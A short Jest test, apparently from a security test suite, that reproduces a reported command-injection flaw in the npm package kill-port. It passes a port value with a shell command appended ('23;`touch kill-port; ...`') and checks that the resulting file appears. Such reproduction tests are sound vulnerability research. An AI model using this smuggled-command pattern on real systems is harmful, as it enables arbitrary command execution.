//https://hackerone.com/reports/389561
test("Command Injection in kill-port", () => {
  expect.assertions(2);
  const kill = require("kill-port");
  const fs = require("fs");
  const path = "./kill-port";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return kill("23;`touch kill-port; 2222222222`").then(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
